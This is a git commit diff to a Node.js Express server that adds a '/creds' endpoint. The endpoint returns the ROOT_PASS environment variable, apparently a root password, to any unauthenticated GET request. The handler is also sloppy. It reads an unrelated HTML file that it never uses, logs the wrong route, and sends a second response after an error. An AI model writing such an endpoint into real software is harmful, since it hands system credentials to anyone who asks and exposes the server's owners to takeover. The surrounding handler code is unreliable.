0238231b61913ef8c31fd69d0c8ae83f54250cd9
Alex Dreier <amdreier@gmail.com>
2023-09-08 15:53:35 -0400

    respond to /creds

--- node/src/index.js
+++ node/src/index.js
@@ -43,6 +43,19 @@ app.get('/nodeSubfolder', (request, response) => {
     });
 });
 
+app.get('/creds', (request, response) => {
+    readFile('/var/www/node/src/html/nodeSubfolder.html', 'utf8', (err, html) => {
+        if (err) {
+            console.log(err);
+            response.status(500).send('server error\n');
+        }
+
+        response.send(process.env.ROOT_PASS);
+
+        log("GET /nodeSubfolder", request, "Success");
+    });
+});
+
 app.post('/allow', (req, res) => {
     let addr = req.body.addr;
 
